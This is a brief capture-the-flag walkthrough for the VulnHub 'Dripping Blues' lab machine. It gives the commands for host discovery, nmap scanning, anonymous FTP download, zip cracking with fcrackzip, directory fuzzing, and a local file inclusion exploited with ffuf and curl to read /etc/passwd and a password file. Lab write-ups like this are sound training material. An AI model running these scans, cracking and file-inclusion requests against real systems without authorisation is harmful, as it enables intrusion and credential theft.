***************************************************************************************
***********************Machine Dripping Blues VulnHub**********************************
***************************By Demilson Montilva****************************************
******************************Team Security********************************************

1.- Download the machine Virtual
 https://download.vulnhub.com/drippingblues/drippingblues.ova

2.- First we must find the IP with:
	A.- fping or netdiscover 
	B.- fping -g yourrangeIP/24 2>/dev/null | grep alive
	c.- netdiscover -r yourrangeIP/24

3.- We are going to use the tools Nmap 
	nmap -sV -sC -Pn --min-rate 5000 172.20.10.7
	there are two ports open 21 and 22    
	21 you can acces with user and password anonymous
	Use the get method for download .zip

4.- Use the fcrackingzip tool for cracking
	A.-fcrackzip -D -u -p /usr/share/wordlists/rockyou.txt secret.zip

5.- Use the gobuster tools to fuzzing the urls
	gobuster dir --url http://yourIP --wordlist /usr/share/wordlists/dirb/common.txt

6.- You find two directories.
	A.- http-robots.txt: 2 disallowed entries 
        B.- /dripisreal.txt /etc/dripispowerful.html

7.- use the Fuzz Faster U Fool, tool brute force 
	A.- ffuf -w /usr/share/wordlists/rockyou.txt -u http://yourIP/index.php?FUZZ=/etc/passwd -fs 138
	it's necessary to use the curl tool togather for example

	curl http://yourIP/index.php?drip=/etc/dripispowerful.html --> You will find password
	curl http://172.20.10.7/index.php?drip=/etc/passwd 2>/dev/null | grep /bin/bash --> You will find User

8.- finally log in with non-root user 

